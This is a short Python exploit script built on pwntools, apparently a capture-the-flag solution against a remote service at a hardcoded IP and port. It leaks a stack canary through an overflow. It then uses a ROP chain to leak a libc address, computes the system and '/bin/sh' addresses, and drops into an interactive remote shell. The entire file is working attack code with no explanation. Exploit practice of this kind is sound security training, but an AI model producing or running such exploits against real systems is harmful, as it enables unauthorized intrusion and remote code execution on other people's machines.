#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

yuan = remote("140.115.59.7",11005)

p = 'a' * 137
yuan.recvuntil(':')
yuan.send(p)
yuan.recvuntil('echo')
output = yuan.recvuntil('I')
canary_5858 = output[138:-1]
canary = canary_5858[:7]
p2 = 'exit' + "A"*132
p2 += '\x00'
p2 += canary
p2 += 'BBBBBBBB' * 2
p2 += "RBBBBBBP"
p2 += p64(0x400923)
p2 += p64(0x601038)
p2 += p64(0x400600)
p2 += p64(0x40078d)
yuan.send(p2)
yuan.recvuntil('~\n')
puts = yuan.recvuntil('\n')
hh = ''.join(hex(ord(c)).replace('0x','') for c in puts[:-1])
rhh = hh[10:] + hh[8:-2] + hh[6:-4] + hh[4:-6] + hh[2:-8] + hh[:-10]
irhh = int(rhh,16)
libc_addr = irhh - 0xf69a0
system_addr = libc_addr + 0x45380
bin_sh_addr = libc_addr + 0x18c58b
p3 = 'exit' + "A"*132
p3 += '\x00'
p3 += canary
p3 += "BBBBBBBB" * 2
p3 += "RBBBBBBP"
p3 += p64(0x400923)
p3 += p64(bin_sh_addr)
p3 += p64(system_addr)
yuan.send(p3)
yuan.interactive()
